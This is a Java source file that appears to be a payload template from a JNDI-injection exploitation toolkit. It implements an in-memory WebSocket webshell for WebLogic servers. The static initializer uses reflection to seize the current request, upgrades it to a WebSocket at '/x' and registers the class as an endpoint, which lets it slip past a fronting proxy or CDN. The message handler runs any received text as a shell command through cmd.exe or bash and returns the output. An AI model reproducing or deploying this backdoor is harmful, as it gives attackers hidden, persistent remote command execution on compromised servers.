package com.qi4l.jndi.template.memshell.BypassNginxCDN;

import java.lang.reflect.Field;
import java.util.*;
import java.io.InputStream;
import javax.servlet.ServletContext;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;

import org.apache.tomcat.websocket.server.WsServerContainer;
import org.apache.tomcat.websocket.Constants;

import javax.websocket.*;

import org.apache.tomcat.websocket.server.WsHandshakeRequest;
import org.apache.tomcat.websocket.WsHandshakeResponse;

import java.nio.charset.StandardCharsets;

import org.apache.tomcat.util.codec.binary.Base64;
import org.apache.tomcat.util.security.ConcurrentMessageDigest;
import org.apache.tomcat.websocket.server.WsHttpUpgradeHandler;
import org.apache.tomcat.websocket.Transformation;
import org.apache.catalina.connector.RequestFacade;
import weblogic.servlet.internal.HttpConnectionHandler;
import weblogic.servlet.internal.ServletRequestImpl;
import weblogic.servlet.internal.ServletResponseImpl;
import weblogic.servlet.provider.ContainerSupportProviderImpl;

public class cmsMSBYNC extends Endpoint implements MessageHandler.Whole<String> {

    static {
        try {
            Map<String, String> pathParams                = Collections.emptyMap();
            List<Extension>     negotiatedExtensionsPhase = Collections.emptyList();
            Transformation      transformation            = null;
            String              subProtocol               = null;

            Thread threadLocal = Thread.currentThread();
            Field  workEntry   = threadLocal.getClass().getDeclaredField("workEntry");
            workEntry.setAccessible(true);
            weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor wlsRequestExecutor = (ContainerSupportProviderImpl.WlsRequestExecutor) workEntry.get(threadLocal);
            Field                                                                     field1             = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
            field1.setAccessible(true);
            weblogic.servlet.internal.HttpConnectionHandler connectionHandler = (HttpConnectionHandler) field1.get(wlsRequestExecutor);
            ServletRequestImpl                              request           = connectionHandler.getServletRequest();
            ServletContext                                  servletContext    = request.getSession().getServletContext();
            ServerEndpointConfig                            configEndpoint    = ServerEndpointConfig.Builder.create(cmsMSBYNC.class, "/x").build();
            WsServerContainer                               container         = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());

            ServletResponseImpl response = connectionHandler.getServletResponse();
            response.setHeader(Constants.UPGRADE_HEADER_NAME, Constants.UPGRADE_HEADER_VALUE);
            response.setHeader(Constants.CONNECTION_HEADER_NAME, Constants.CONNECTION_HEADER_VALUE);
            response.setHeader(HandshakeResponse.SEC_WEBSOCKET_ACCEPT, getWebSocketAccept(request.getHeader("Sec-WebSocket-Key")));
            response.setStatus(101);
            WsHandshakeRequest  wsRequest  = new WsHandshakeRequest(request, pathParams);
            WsHandshakeResponse wsResponse = new WsHandshakeResponse();
            configEndpoint.getConfigurator().modifyHandshake(configEndpoint, wsRequest, wsResponse);
            try {
                WsHttpUpgradeHandler wsHandler = request.upgrade(WsHttpUpgradeHandler.class);
                wsHandler.preInit(configEndpoint, container, wsRequest, negotiatedExtensionsPhase, subProtocol, transformation, pathParams, request.isSecure());
                // Tomcat 7 //wsHandler.preInit((Endpoint)configEndpoint, configEndpoint, container, wsRequest, negotiatedExtensionsPhase2, subProtocol, transformation, pathParams, request.isSecure());
            } catch (Exception e) {
                e.printStackTrace();
            }
        } catch (Exception ignored) {
        }
    }
    private Session session;
    @Override
    public void onOpen(Session session, EndpointConfig endpointConfig) {
        this.session = session;
        session.addMessageHandler(this);
    }

    @Override
    public void onMessage(String s) {
        try {
            Process process;
            boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
            if (bool) {
                process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", s });
            } else {
                process = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", s });
            }
            InputStream inputStream = process.getInputStream();
            StringBuilder stringBuilder = new StringBuilder();
            int i;
            while ((i = inputStream.read()) != -1)
                stringBuilder.append((char)i);
            inputStream.close();
            process.waitFor();
            session.getBasicRemote().sendText(stringBuilder.toString());
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    private static String getWebSocketAccept(String key) {
        byte[] WS_ACCEPT = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11".getBytes(StandardCharsets.ISO_8859_1);
        byte[] digest = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);
        return Base64.encodeBase64String(digest);
    }
}
